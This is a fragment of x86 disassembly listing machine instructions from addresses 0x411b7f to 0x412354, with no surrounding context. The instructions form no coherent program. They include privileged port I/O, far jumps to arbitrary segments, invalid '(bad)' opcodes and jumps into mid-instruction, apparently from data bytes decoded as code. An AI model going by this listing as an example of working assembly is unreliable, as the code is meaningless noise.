  411b7f:	or     eax,0xf17541f2
  411b84:	loop   0x411b37
  411b86:	xor    eax,0xc1ec3901
  411b8b:	lds    ebx,FWORD PTR [ebp+0x7c]
  411b8e:	cwde   
  411b8f:	cld    
  411b90:	and    al,BYTE PTR [ebp+0x554e1f97]
  411b96:	mov    bl,0xff
  411b98:	rcl    dh,cl
  411b9a:	sub    ah,BYTE PTR [ebp-0x1c0ee7a6]
  411ba0:	pop    ss
  411ba1:	push   esp
  411ba2:	out    0x74,eax
  411ba4:	push   es
  411ba5:	test   bh,bh
  411ba7:	inc    DWORD PTR [ebp+0x1e]
  411baa:	xchg   edx,eax
  411bab:	dec    esp
  411bac:	pop    ds
  411bad:	rcl    BYTE PTR [ebx-0x7ef094ba],cl
  411bb3:	jmp    0x411b5e
  411bb5:	cmp    cl,bl
  411bb7:	out    0xa6,eax
  411bb9:	sbb    edx,DWORD PTR [ecx]
  411bbb:	inc    esp
  411bbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bbd:	lahf   
  411bbe:	push   0xffffffe2
  411bc0:	call   0x5fa9:0xad827194
  411bc7:	retf   0x132b
  411bca:	sub    ebx,DWORD PTR [edx]
  411bcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411bcd:	inc    edi
  411bce:	shl    DWORD PTR [esi],1
  411bd0:	test   al,0xc8
  411bd2:	sbb    eax,0x8e0b9f01
  411bd7:	sbb    eax,0xa0ec5d62
  411bdc:	fistp  DWORD PTR [eax]
  411bde:	sbb    bh,BYTE PTR [eax+0xc]
  411be1:	int    0xde
  411be3:	pushf  
  411be4:	sub    DWORD PTR [esi+0x30],edx
  411be7:	test   BYTE PTR ds:0xb505556b,bh
  411bed:	mov    WORD PTR [ebx-0x13fdf5c8],ds
  411bf3:	xchg   BYTE PTR [esp+eiz*2-0x318f19cb],dl
  411bfa:	in     al,0x22
  411bfc:	mov    dl,0x53
  411bfe:	adc    eax,DWORD PTR [ebx+ebx*8-0x7f54b30a]
  411c05:	mov    edi,0xdb1e49fb
  411c0a:	mov    ch,0x52
  411c0c:	inc    ecx
  411c0d:	adc    DWORD PTR [ebx+0x21],ebx
  411c10:	pop    edx
  411c11:	and    al,0x4d
  411c13:	lds    edx,FWORD PTR [ebx+0x4505e0]
  411c19:	fisttp DWORD PTR [ebp-0x56]
  411c1c:	and    cl,bl
  411c1e:	add    al,0xe9
  411c20:	retf   
  411c21:	pop    edi
  411c22:	mov    al,0xaf
  411c24:	mov    al,0xf3
  411c26:	pop    esp
  411c27:	shl    BYTE PTR [eax+eiz*4+0x3f],1
  411c2b:	stc    
  411c2c:	jle    0x411c7d
  411c2e:	push   ecx
  411c2f:	sar    DWORD PTR [ebp-0x53],cl
  411c32:	enter  0xdc99,0x3c
  411c36:	je     0x411c24
  411c38:	fxrstor [ecx+0x63]
  411c3c:	or     dh,BYTE PTR [esi+0xa]
  411c3f:	iret   
  411c40:	xchg   esi,eax
  411c41:	in     al,dx
  411c42:	test   al,0x98
  411c44:	push   0xffffff90
  411c46:	addr16 mov ch,0x83
  411c49:	fist   DWORD PTR [ebx-0x6e]
  411c4c:	scas   al,BYTE PTR es:[edi]
  411c4d:	fdiv   QWORD PTR [esi-0x4e]
  411c50:	jp     0x411c86
  411c52:	(bad)  
  411c53:	fwait
  411c54:	sub    BYTE PTR [ebp+eax*4-0x2de5bb3a],0xbc
  411c5c:	dec    esp
  411c5d:	push   edx
  411c5e:	dec    ecx
  411c5f:	adc    dl,BYTE PTR [edi-0x5baa4ef3]
  411c65:	cmp    dh,BYTE PTR [ecx]
  411c67:	cmc    
  411c68:	push   edi
  411c69:	iret   
  411c6a:	adc    BYTE PTR [esi],dh
  411c6c:	shl    BYTE PTR [ecx-0x18cf376c],1
  411c72:	sub    DWORD PTR [eax],eax
  411c74:	cmp    al,BYTE PTR [eax+0x44c1761e]
  411c7a:	cmp    cl,BYTE PTR [esi-0x61cd5625]
  411c80:	adc    dl,dh
  411c82:	test   al,0x90
  411c84:	adc    ecx,DWORD PTR [edx+0x145a3752]
  411c8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c8b:	jne    0x411d0b
  411c8d:	add    al,0x1c
  411c8f:	fnstenv [ebp+0xea7a64d]
  411c95:	enter  0xde98,0xb0
  411c99:	repnz sti 
  411c9b:	fsubr  DWORD PTR [ebx-0x39bd5252]
  411ca1:	sti    
  411ca2:	ins    BYTE PTR es:[edi],dx
  411ca3:	pop    ds
  411ca4:	pop    esi
  411ca5:	cmp    eax,0x8b7654bd
  411caa:	xor    al,0xf7
  411cac:	loopne 0x411cf4
  411cae:	jl     0x411d0b
  411cb0:	lods   al,BYTE PTR ds:[esi]
  411cb1:	imul   edx,DWORD PTR [edi+0x31],0xb250fe4
  411cb8:	jbe    0x411c92
  411cba:	xor    BYTE PTR [ecx],dl
  411cbc:	inc    BYTE PTR [ecx]
  411cbe:	ds or  eax,0xadbba2a9
  411cc4:	add    BYTE PTR [ebx+0x30],cl
  411cc7:	ins    DWORD PTR es:[edi],dx
  411cc8:	das    
  411cc9:	push   ds
  411cca:	mov    DWORD PTR [ecx+0x2a8ff524],ebp
  411cd0:	mov    al,0x52
  411cd2:	jbe    0x411c9a
  411cd4:	ja     0x411cea
  411cd6:	mov    ch,0x4d
  411cd8:	retf   0xbfa6
  411cdb:	xchg   esi,eax
  411cdc:	call   esi
  411cde:	sub    DWORD PTR [ebx-0x6040fd22],edx
  411ce4:	fsubr  QWORD PTR [edi-0x17]
  411ce7:	xchg   edi,eax
  411ce8:	adc    edx,DWORD PTR [edi-0x4422708b]
  411cee:	sbb    eax,0x3d66ca88
  411cf3:	inc    edi
  411cf4:	adc    DWORD PTR [eax+ecx*2-0x8],eax
  411cf8:	and    ecx,DWORD PTR [eax]
  411cfa:	in     al,dx
  411cfb:	sti    
  411cfc:	fdivrp st(7),st
  411cfe:	xor    DWORD PTR [ebp-0x1eb1c53c],eax
  411d04:	je     0x411ca8
  411d06:	cdq    
  411d07:	push   esp
  411d09:	mov    bh,0x94
  411d0b:	add    al,0xe5
  411d0d:	mov    esi,0x76f4e2ea
  411d12:	xchg   esi,eax
  411d13:	dec    esp
  411d14:	mov    ebx,0xf8329389
  411d19:	xchg   edx,eax
  411d1a:	add    eax,ebx
  411d1c:	mov    dl,0xc8
  411d1e:	mov    dl,0x90
  411d20:	pusha  
  411d21:	mov    ecx,0xa38dde10
  411d26:	push   0xffffffd9
  411d28:	and    dl,BYTE PTR [ebx]
  411d2a:	addr16 retf 
  411d2c:	psubb  mm2,QWORD PTR ds:0x26c5a88b
  411d33:	or     bh,bh
  411d35:	loopne 0x411cef
  411d37:	iret   
  411d38:	jae    0x411d98
  411d3a:	mov    esi,0xd40d9012
  411d3f:	(bad)  
  411d40:	rol    DWORD PTR [ebx-0x6b],cl
  411d43:	or     DWORD PTR [eax],0x9679fb8d
  411d49:	pop    ebx
  411d4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d4b:	jno    0x411d66
  411d4d:	dec    esp
  411d4e:	outs   dx,DWORD PTR ds:[esi]
  411d4f:	fadd   DWORD PTR [si]
  411d52:	pop    esp
  411d53:	push   eax
  411d54:	cmp    BYTE PTR [ebx],bh
  411d56:	mov    dl,0xe5
  411d58:	xchg   esp,eax
  411d59:	popa   
  411d5a:	out    dx,al
  411d5b:	inc    edx
  411d5c:	xor    eax,0xce3bb8bd
  411d61:	lods   eax,DWORD PTR ds:[esi]
  411d62:	test   al,0x59
  411d64:	dec    ebp
  411d65:	pop    ebp
  411d66:	cmc    
  411d67:	int    0xda
  411d69:	(bad)  
  411d6a:	fist   DWORD PTR [eax]
  411d6c:	(bad)  
  411d6d:	mov    ah,0x3f
  411d6f:	arpl   WORD PTR [ebx],si
  411d71:	sub    ecx,0x12
  411d74:	xlat   BYTE PTR ds:[ebx]
  411d75:	or     BYTE PTR [ebp+0x73],0x5c
  411d79:	mov    esi,0x2350426b
  411d7e:	mov    bh,0x8d
  411d80:	mov    edi,DWORD PTR [edi+0x22]
  411d83:	in     al,0x9f
  411d85:	jg     0x411d69
  411d87:	adc    dh,BYTE PTR [esi]
  411d89:	outs   dx,BYTE PTR ds:[esi]
  411d8a:	cmp    dl,BYTE PTR [eax-0x772e6897]
  411d90:	loope  0x411d8c
  411d92:	lds    ebp,FWORD PTR [eax+0x16b33ab4]
  411d98:	adc    BYTE PTR [ebx+0x78fc69eb],cl
  411d9e:	or     al,0x31
  411da0:	pop    edx
  411da1:	pusha  
  411da2:	pop    ss
  411da3:	mov    edi,0xb6e4de7a
  411da8:	push   ebx
  411da9:	loopne 0x411d50
  411dab:	add    ebx,DWORD PTR [edx-0x10bd129f]
  411db1:	aaa    
  411db2:	mov    esi,0x33a63fe9
  411db7:	fisubr WORD PTR [edi+esi*4-0x3f517ac2]
  411dbe:	cmp    eax,0xd6211da2
  411dc3:	sub    edi,DWORD PTR [edi-0x54]
  411dc6:	jbe    0x411d95
  411dc8:	sbb    ebx,DWORD PTR [edi+ebx*8]
  411dcb:	jns    0x411e43
  411dcd:	mov    esi,0x693374a2
  411dd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411dd3:	imul   edx,ebp,0x50
  411dd6:	pop    ebp
  411dd7:	sub    al,BYTE PTR [eiz*1+0x7d7de95b]
  411dde:	scas   eax,DWORD PTR es:[edi]
  411ddf:	adc    DWORD PTR [esi],ebx
  411de1:	dec    ebx
  411de2:	cdq    
  411de3:	ins    DWORD PTR es:[edi],dx
  411de4:	call   0x32c3aa38
  411de9:	stos   DWORD PTR es:[edi],eax
  411dea:	mov    ch,0xed
  411dec:	je     0x411e42
  411dee:	mov    al,0x2
  411df0:	cmp    al,0xba
  411df2:	ret    0x66e5
  411df5:	adc    ah,BYTE PTR [eax+0x1f]
  411df8:	sbb    eax,0x93c924d4
  411dfd:	ror    BYTE PTR [edi+edx*1],1
  411e00:	sahf   
  411e01:	loop   0x411e54
  411e03:	sti    
  411e04:	pop    edi
  411e05:	add    esp,ebx
  411e07:	fucomi st,st(1)
  411e09:	shr    BYTE PTR [ebx],1
  411e0b:	imul   ebp,DWORD PTR [ebp+0x17],0x7a
  411e0f:	outs   dx,BYTE PTR ds:[esi]
  411e10:	repz adc BYTE PTR [ebx+ebx*8+0x740b0cb2],ah
  411e18:	adc    esi,DWORD PTR [esi+0x1b045bb6]
  411e1e:	xchg   ebx,eax
  411e1f:	xchg   dh,bh
  411e21:	hlt    
  411e22:	cmp    bh,BYTE PTR [eax]
  411e24:	shl    BYTE PTR [edx*1+0x462050f8],0xd3
  411e2c:	(bad)  
  411e2d:	adc    BYTE PTR gs:[edx+0x1f],ah
  411e31:	push   ss
  411e32:	in     al,0xf4
  411e34:	sbb    DWORD PTR [ecx-0x3e8fc7be],esi
  411e3a:	pop    eax
  411e3b:	out    0x43,al
  411e3d:	jbe    0x411ebc
  411e3f:	sbb    DWORD PTR [edi+0x4afe38bb],esp
  411e45:	add    BYTE PTR ds:[edi+0x2c],al
  411e49:	jl     0x411e71
  411e4b:	fistp  QWORD PTR [esi+edi*1-0x20]
  411e4f:	loop   0x411deb
  411e51:	xchg   DWORD PTR [esi-0x62a238a],ecx
  411e57:	aaa    
  411e58:	icebp  
  411e59:	or     edx,ebx
  411e5b:	iret   
  411e5c:	push   0xffffff87
  411e5e:	adc    cl,ah
  411e60:	jns    0x411e21
  411e62:	loope  0x411e40
  411e64:	push   0x371ddab2
  411e69:	sar    BYTE PTR [eax],1
  411e6b:	shr    edx,0x61
  411e6e:	inc    eax
  411e6f:	pop    ebp
  411e70:	and    ecx,DWORD PTR [ebx-0x42]
  411e73:	mov    ecx,0x7f8e53ed
  411e78:	arpl   WORD PTR [ebp-0x72],ax
  411e7b:	xchg   edx,eax
  411e7c:	sbb    eax,0x4d38e486
  411e81:	pop    ss
  411e82:	stos   DWORD PTR es:[edi],eax
  411e83:	rcr    BYTE PTR ss:[edi-0x6d921042],cl
  411e8a:	and    dh,bh
  411e8c:	xor    DWORD PTR [edi],0xb628ecbf
  411e92:	outs   dx,DWORD PTR ds:[esi]
  411e93:	push   cs
  411e94:	pop    edi
  411e95:	inc    edi
  411e96:	mov    esp,esp
  411e98:	test   eax,0xa21c508d
  411e9d:	test   al,0xa4
  411e9f:	sub    eax,0xe3de1c33
  411ea4:	or     edi,esp
  411ea6:	mov    ah,0xb4
  411ea8:	rcl    DWORD PTR [edi-0x46b048e7],0x65
  411eaf:	loope  0x411f28
  411eb1:	mov    bh,0xea
  411eb3:	rcr    DWORD PTR [edi+edx*4+0x6bf63949],0x47
  411ebb:	sar    DWORD PTR [ebp+ebp*1+0x15],0x71
  411ec0:	xor    dh,bh
  411ec2:	adc    DWORD PTR [ebx+eiz*1-0x59],edi
  411ec6:	inc    ecx
  411ec7:	mov    dh,0x8b
  411ec9:	cmp    dh,BYTE PTR es:0x49ae008
  411ed0:	mov    bh,0x61
  411ed2:	fbld   TBYTE PTR [ecx]
  411ed4:	mov    dl,0xb8
  411ed6:	jno    0x411ee3
  411ed8:	mov    DWORD PTR [edx+0x6b9f08ea],ebp
  411ede:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411edf:	and    ecx,DWORD PTR [edi-0x44]
  411ee2:	jne    0x411eb8
  411ee4:	mov    ds:0xd3f8da73,eax
  411ee9:	in     eax,dx
  411eea:	mov    gs,WORD PTR [ebp-0x19]
  411eed:	popf   
  411eee:	push   ebp
  411eef:	fdiv   QWORD PTR ds:0xa298e1ea
  411ef5:	push   eax
  411ef6:	pusha  
  411ef7:	sub    BYTE PTR [ebx-0x61],bh
  411efa:	cmp    al,0x59
  411efc:	xchg   edi,eax
  411efd:	mov    cl,0xc7
  411eff:	cs test eax,0xbecb3df7
  411f05:	mov    ch,0x21
  411f07:	sbb    eax,0x58046a59
  411f0c:	arpl   WORD PTR [ebx-0x5918553a],cx
  411f12:	mov    cl,0xdf
  411f14:	and    ebp,DWORD PTR [ebx-0x59]
  411f17:	repz xor al,0xbd
  411f1a:	mov    ebp,0x685603ca
  411f1f:	push   ss
  411f20:	fwait
  411f21:	ss add al,0x16
  411f24:	sbb    eax,DWORD PTR [edi+0x7c123881]
  411f2a:	pushf  
  411f2b:	mov    ebx,0x3cc16ebd
  411f30:	(bad)  
  411f31:	dec    eax
  411f32:	out    0xf,eax
  411f34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f35:	in     eax,0x1d
  411f37:	js     0x411ef0
  411f39:	sub    bh,0x2f
  411f3c:	(bad)  
  411f3d:	cli    
  411f3e:	xchg   dh,ch
  411f40:	adc    dh,BYTE PTR [esi+0x2503518b]
  411f46:	lods   al,BYTE PTR ds:[esi]
  411f47:	jecxz  0x411ed6
  411f49:	lods   al,BYTE PTR ds:[esi]
  411f4a:	lods   eax,DWORD PTR ds:[esi]
  411f4b:	arpl   bx,si
  411f4d:	cwde   
  411f4e:	push   0x3bc55bbe
  411f53:	mov    edx,0x282f78f5
  411f58:	and    eax,edi
  411f5a:	dec    esp
  411f5b:	mov    ebx,0x4bdb60a2
  411f60:	and    DWORD PTR [ebx],edi
  411f62:	mov    cl,0xab
  411f64:	push   esp
  411f65:	pop    es
  411f66:	mov    ebx,0x9754ac6c
  411f6b:	mov    bh,0x5
  411f6d:	adc    al,0x20
  411f6f:	push   0xe6f56dc
  411f74:	sub    dl,dh
  411f76:	push   edx
  411f77:	inc    ecx
  411f78:	fnstcw WORD PTR [ebp+edi*2-0x73a996da]
  411f7f:	or     BYTE PTR [eax+0x47c4a78],dl
  411f85:	in     eax,0x24
  411f87:	jmp    edx
  411f89:	lahf   
  411f8a:	ins    BYTE PTR es:[edi],dx
  411f8b:	or     al,0xe8
  411f8d:	jo     0x411f36
  411f8f:	ss js  0x411fa6
  411f92:	test   DWORD PTR fs:[ecx],eax
  411f95:	ds test eax,0xe8de2ca5
  411f9b:	xor    BYTE PTR [edx+0x2afe3675],ch
  411fa1:	jne    0x411f67
  411fa3:	xchg   ebp,eax
  411fa4:	pop    ss
  411fa5:	or     bl,BYTE PTR [ebx-0x6a27495]
  411fab:	fstp   DWORD PTR es:[ebp-0x7cbd1061]
  411fb2:	ret    
  411fb3:	sbb    BYTE PTR [edi],bl
  411fb5:	mov    ch,BYTE PTR [ebx+0x13]
  411fb8:	es lock call 0x8b26:0xafaf58b1
  411fc1:	fsub   st,st(7)
  411fc3:	add    al,0x7c
  411fc5:	dec    edi
  411fc6:	inc    edi
  411fc7:	jle    0x411f84
  411fc9:	popa   
  411fca:	xor    eax,0x52a54633
  411fcf:	mov    al,ds:0x70119052
  411fd4:	jae    0x412051
  411fd6:	push   ds
  411fd7:	adc    BYTE PTR [eax+0x6f],al
  411fda:	hlt    
  411fdb:	aad    0xee
  411fdd:	jmp    0x411f61
  411fdf:	popf   
  411fe0:	int    0x94
  411fe2:	inc    eax
  411fe3:	icebp  
  411fe4:	ins    BYTE PTR es:[edi],dx
  411fe5:	add    DWORD PTR [ebx+0x3b],ebp
  411fe8:	fld    DWORD PTR [edi+0x7]
  411feb:	test   al,0x20
  411fed:	shl    ecx,cl
  411fef:	sbb    esp,ebx
  411ff1:	xchg   ebx,eax
  411ff2:	shl    BYTE PTR [eax+0x50],1
  411ff5:	xchg   edi,eax
  411ff6:	aaa    
  411ff7:	mov    DWORD PTR [edx-0x65373c52],ebx
  411ffd:	adc    ch,BYTE PTR [ebp+0x15]
  412000:	pop    ebp
  412001:	mov    esp,0xf47cd468
  412006:	test   al,0x1
  412008:	mov    ds:0xd653e1d8,al
  41200d:	mov    ecx,0x23e8bc85
  412012:	inc    edx
  412013:	xor    al,0xae
  412015:	nop
  412016:	sbb    DWORD PTR [edx+0x49],ebx
  412019:	push   esi
  41201a:	xchg   esi,eax
  41201b:	mov    WORD PTR [eax+esi*8-0x64],?
  41201f:	or     DWORD PTR [ecx],edx
  412021:	fucom  st(4)
  412023:	repnz out dx,eax
  412025:	cmp    ebx,DWORD PTR [ebp-0x756c04f8]
  41202b:	sbb    eax,0x75a62290
  412030:	add    ebx,0x89757d8c
  412036:	mov    dl,0xd8
  412038:	inc    ebx
  412039:	stc    
  41203a:	xchg   edx,eax
  41203b:	test   eax,0x74f9bfa3
  412040:	jno    0x411ff4
  412042:	gs adc DWORD PTR ss:[ecx+ebx*4],edx
  412047:	dec    ebp
  412048:	or     WORD PTR ds:0xf694131a,si
  41204f:	loop   0x412029
  412051:	or     ecx,DWORD PTR [ebx+0x44]
  412054:	test   DWORD PTR [ebx*8+0x6f87ba01],esp
  41205b:	into   
  41205c:	(bad)  
  41205d:	mov    eax,ds:0xe7d322cd
  412062:	mov    esi,0x21af8e22
  412067:	mov    ds:0xd88516b3,al
  41206c:	add    eax,0x6d0c1df5
  412071:	add    eax,0x8013569b
  412076:	out    0xee,eax
  412078:	pop    esi
  412079:	pop    ss
  41207a:	cmp    ebp,ecx
  41207c:	or     eax,0x7d08de6b
  412081:	sahf   
  412082:	(bad)  
  412084:	xor    eax,0xbd9dc4e8
  412089:	add    BYTE PTR [ebx-0x40195f0f],dh
  41208f:	repz hlt 
  412091:	xchg   ebp,eax
  412092:	test   BYTE PTR [edi+0x5a03c8cc],cl
  412098:	ss xor eax,0x36ea03e3
  41209e:	adc    edi,DWORD PTR ds:0xd746a6a5
  4120a4:	aas    
  4120a5:	sbb    DWORD PTR [edx+0x39],edi
  4120a8:	sub    ah,BYTE PTR [ebx+0x6e68acea]
  4120ae:	cli    
  4120af:	test   DWORD PTR [esi-0x2271f361],0x18ed5733
  4120b9:	push   0xf8314c86
  4120be:	scas   eax,DWORD PTR es:[edi]
  4120bf:	popa   
  4120c0:	push   eax
  4120c1:	shr    DWORD PTR [edx],0x6b
  4120c4:	mov    esi,0x9be34dd3
  4120c9:	and    ch,dl
  4120cb:	leave  
  4120cc:	add    ebp,ebx
  4120ce:	sbb    BYTE PTR [ebx-0x18],ah
  4120d1:	pop    edx
  4120d2:	push   esi
  4120d3:	test   al,0xf2
  4120d5:	in     al,dx
  4120d6:	ret    
  4120d7:	and    ch,BYTE PTR [edx+0x9]
  4120da:	cmp    cl,dh
  4120dc:	test   al,0xdb
  4120de:	sti    
  4120df:	je     0x412128
  4120e1:	pusha  
  4120e2:	mov    ah,0xba
  4120e4:	sbb    edx,DWORD PTR [ebp+0x5e]
  4120e7:	fiadd  DWORD PTR [eax+0x73a36f34]
  4120ed:	call   edx
  4120ef:	adc    BYTE PTR [esi],ah
  4120f1:	push   ecx
  4120f2:	cmp    eax,0xc31b563d
  4120f7:	out    dx,eax
  4120f8:	pop    ss
  4120f9:	jnp    0x4120a5
  4120fb:	push   ecx
  4120fc:	mov    eax,DWORD PTR ds:0x3a384b0a
  412102:	pusha  
  412103:	clc    
  412104:	push   0x23d3b90e
  412109:	iret   
  41210a:	xor    edi,DWORD PTR [edx]
  41210c:	mov    ds,WORD PTR [edx-0x39]
  41210f:	or     eax,DWORD PTR [ebp-0x153fe573]
  412115:	pop    edi
  412116:	add    al,0x68
  412118:	mov    ebp,0x497429c0
  41211d:	ja     0x41214b
  41211f:	and    esi,DWORD PTR ds:0x3fd1adcc
  412125:	dec    ecx
  412126:	call   0xd42bed33
  41212b:	ja     0x412131
  41212d:	xchg   ebx,eax
  41212e:	sub    bh,cl
  412130:	ret    
  412131:	push   0xffffffae
  412133:	push   0xffffffc0
  412135:	loope  0x412184
  412137:	(bad)  
  412138:	mov    ds:0xfc73200d,eax
  41213d:	aam    0xa7
  41213f:	mov    dh,cl
  412141:	pushf  
  412142:	dec    edi
  412143:	push   ds
  412144:	cli    
  412145:	and    al,0x4f
  412147:	fdiv   QWORD PTR [edx]
  412149:	inc    edx
  41214a:	mov    WORD PTR [esi],ds
  41214c:	scas   al,BYTE PTR es:[edi]
  41214d:	sub    al,0xbf
  41214f:	hlt    
  412150:	xor    DWORD PTR [edx-0x6753d87c],eax
  412156:	jmp    0x4563:0x26e23f40
  41215d:	sub    eax,DWORD PTR [eax]
  41215f:	xchg   DWORD PTR [ebp-0x3f327a6c],edx
  412165:	inc    edx
  412166:	adc    BYTE PTR [esi+0x6bf89118],dl
  41216c:	and    eax,0x291ff007
  412171:	xchg   ecx,eax
  412172:	mov    ecx,0x6a5e603
  412177:	mov    dh,0xe4
  412179:	or     edi,esp
  41217b:	mov    ch,0xa
  41217d:	mov    bh,0x13
  41217f:	sbb    BYTE PTR [eax+0x45],dl
  412182:	or     ch,BYTE PTR [esi-0x3a370abc]
  412188:	mov    WORD PTR [edi-0x3d],ds
  41218b:	pop    ss
  41218c:	mov    al,ds:0x115713cc
  412191:	jnp    0x41219d
  412193:	push   cs
  412194:	push   ecx
  412195:	and    cl,BYTE PTR [ebp-0x76]
  412198:	jge    0x41220c
  41219a:	hlt    
  41219b:	aad    0xf3
  41219d:	and    edx,DWORD PTR [ecx+0x16]
  4121a0:	bound  esp,QWORD PTR [ebx]
  4121a2:	mov    ecx,0xce2e5dcb
  4121a7:	inc    ebx
  4121a8:	test   al,0x39
  4121aa:	and    eax,DWORD PTR [eax]
  4121ac:	sub    al,0xe1
  4121ae:	sbb    eax,ebx
  4121b0:	xor    DWORD PTR [edi-0x40308476],esi
  4121b6:	push   eax
  4121b7:	cmp    DWORD PTR [ebx-0x63],ebx
  4121ba:	jle    0x4121f1
  4121bc:	add    bh,BYTE PTR [eax]
  4121be:	(bad)  
  4121bf:	aad    0x47
  4121c1:	ret    0xf7c9
  4121c4:	jg     0x41220a
  4121c6:	loopne 0x41215f
  4121c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121c9:	or     dl,BYTE PTR [edx-0x69]
  4121cc:	popf   
  4121cd:	xchg   ecx,eax
  4121ce:	ja     0x41222c
  4121d0:	xlat   BYTE PTR ds:[ebx]
  4121d1:	arpl   WORD PTR [edx],ax
  4121d3:	dec    ecx
  4121d4:	mov    bh,0xf8
  4121d6:	(bad)
  4121da:	xchg   BYTE PTR [ecx+0x77],bh
  4121dd:	xchg   esi,eax
  4121de:	dec    esi
  4121df:	add    dh,BYTE PTR [edi+0x6a]
  4121e2:	das    
  4121e3:	cld    
  4121e4:	ficom  WORD PTR [ebx]
  4121e6:	mov    eax,ds:0x6572653e
  4121eb:	loopne 0x4121f6
  4121ed:	push   edx
  4121ee:	in     eax,dx
  4121ef:	sti    
  4121f0:	dec    esi
  4121f1:	pop    ecx
  4121f2:	test   al,0x77
  4121f4:	or     dl,BYTE PTR ds:0x912119de
  4121fa:	or     eax,0x875739d2
  4121ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412200:	loopne 0x4121c2
  412202:	out    0x7d,al
  412204:	sub    ebp,DWORD PTR [edx]
  412206:	outs   dx,BYTE PTR ds:[esi]
  412207:	xor    edi,edi
  412209:	add    eax,0x325f8e9d
  41220e:	dec    eax
  41220f:	(bad)  
  412210:	push   0x32
  412212:	js     0x4121eb
  412214:	push   ecx
  412215:	pop    esi
  412216:	adc    ecx,ebp
  412218:	add    eax,0x19
  41221b:	daa    
  41221c:	enter  0x2358,0x85
  412220:	adc    al,0x19
  412222:	mov    cl,0x49
  412224:	popf   
  412225:	and    DWORD PTR [ecx],0xd14b2cb7
  41222b:	sbb    BYTE PTR [ebp-0x1b8f2ad1],dh
  412231:	hlt    
  412232:	inc    edi
  412233:	push   cs
  412234:	enter  0x337c,0x52
  412238:	mov    ds,edi
  41223a:	dec    edi
  41223b:	addr16 push ebx
  41223d:	pop    esi
  41223e:	dec    esi
  41223f:	call   DWORD PTR [esi-0xffd0aa7]
  412245:	gs dec esi
  412247:	sub    edx,DWORD PTR [ecx+ecx*4]
  41224a:	inc    edi
  41224b:	or     eax,0xa9da8e54
  412250:	or     eax,0xc09d752a
  412255:	jecxz  0x412298
  412257:	adc    al,BYTE PTR [edi]
  412259:	pushf  
  41225a:	xchg   ebp,eax
  41225b:	fnstcw WORD PTR [ebx+eiz*2+0x33]
  41225f:	mov    BYTE PTR [ebx+0x6c2bb5e5],al
  412265:	out    0x9e,al
  412267:	adc    DWORD PTR [ebp+edx*8-0xc],edx
  41226b:	pop    ebp
  41226c:	push   0x48811dfc
  412271:	mov    DWORD PTR [edx+edi*2+0x4d],esp
  412275:	push   ss
  412276:	es push esp
  412278:	aaa    
  412279:	stos   BYTE PTR es:[edi],al
  41227a:	sbb    BYTE PTR [ecx+0xc5f85e4],dl
  412280:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412281:	mov    edi,0xc110f3a3
  412286:	stc    
  412287:	push   ebp
  412288:	out    dx,al
  412289:	shr    BYTE PTR [edx+edx*8+0x2b],1
  41228d:	imul   esi,ebp,0x76250b59
  412293:	cmp    bl,bl
  412295:	das    
  412296:	call   0x648fbb0c
  41229b:	pop    ds
  41229c:	ret    0x571a
  41229f:	gs xchg edi,eax
  4122a1:	popa   
  4122a2:	hlt    
  4122a3:	jno    0x412316
  4122a5:	jp     0x412288
  4122a7:	scas   eax,DWORD PTR es:[edi]
  4122a8:	das    
  4122a9:	(bad)  
  4122aa:	push   ecx
  4122ab:	xchg   BYTE PTR [eax-0x4b],dl
  4122ae:	push   ss
  4122af:	stc    
  4122b0:	dec    eax
  4122b1:	add    al,BYTE PTR [edi-0x67]
  4122b4:	push   cs
  4122b5:	mov    ds:0x29af72e7,al
  4122ba:	leave  
  4122bb:	jo     0x41229e
  4122bd:	into   
  4122be:	inc    ebp
  4122bf:	xchg   ebx,eax
  4122c0:	scas   eax,DWORD PTR es:[edi]
  4122c1:	in     eax,dx
  4122c2:	jg     0x412252
  4122c4:	cmp    al,BYTE PTR [ebp+ebp*1-0x70]
  4122c8:	dec    esi
  4122c9:	test   BYTE PTR [edx],bh
  4122cb:	out    0xc4,eax
  4122cd:	enter  0x136c,0x2b
  4122d1:	out    dx,al
  4122d2:	sbb    DWORD PTR [edx],esi
  4122d4:	js     0x412275
  4122d6:	ffree  st(4)
  4122d8:	pop    eax
  4122d9:	jb     0x412326
  4122db:	mov    es,esp
  4122dd:	out    0x74,eax
  4122df:	leave  
  4122e0:	retf   0x445d
  4122e3:	pop    ds
  4122e4:	dec    esp
  4122e5:	test   eax,0x7d479a02
  4122ea:	sub    bl,0x33
  4122ed:	iret   
  4122ee:	cs jle 0x4122a3
  4122f1:	dec    ebx
  4122f2:	into   
  4122f3:	shl    esp,0x34
  4122f6:	mov    BYTE PTR [esi+edx*4+0x775fbd03],dl
  4122fd:	in     eax,0x5c
  4122ff:	test   al,0xd
  412301:	xor    cl,bh
  412303:	push   esp
  412304:	in     al,dx
  412305:	push   ebp
  412306:	pop    DWORD PTR [eax+0x7b]
  412309:	cmp    ebx,DWORD PTR [esi+0x5e]
  41230c:	sub    eax,0x63032c0a
  412311:	je     0x412299
  412313:	jge    0x41233b
  412315:	fnstcw WORD PTR [ecx+0x23d98800]
  41231b:	loop   0x412332
  41231d:	jp     0x41235c
  41231f:	jno    0x412332
  412321:	fstp   TBYTE PTR [edx+eiz*1]
  412324:	fwait
  412325:	(bad)  
  412326:	adc    esp,DWORD PTR [ebp+0x5a629bb3]
  41232c:	imul   ecx,DWORD PTR [edx],0xffffffbd
  41232f:	xchg   ebx,eax
  412330:	lods   eax,DWORD PTR ds:[esi]
  412331:	pushf  
  412332:	ins    DWORD PTR es:[edi],dx
  412333:	test   bx,si
  412336:	or     ebp,DWORD PTR [edi]
  412338:	push   0x1
  41233a:	pop    es
  41233b:	and    DWORD PTR [ebx+0x6],0x3801f8d5
  412342:	xchg   DWORD PTR [ebx-0x439e2787],ecx
  412348:	jb     0x41230f
  41234a:	mov    ds:0xada87284,al
  41234f:	xor    dl,BYTE PTR [ebp+0x24]
  412352:	xchg   BYTE PTR [ecx],cl
  412354:	jns    0x412363
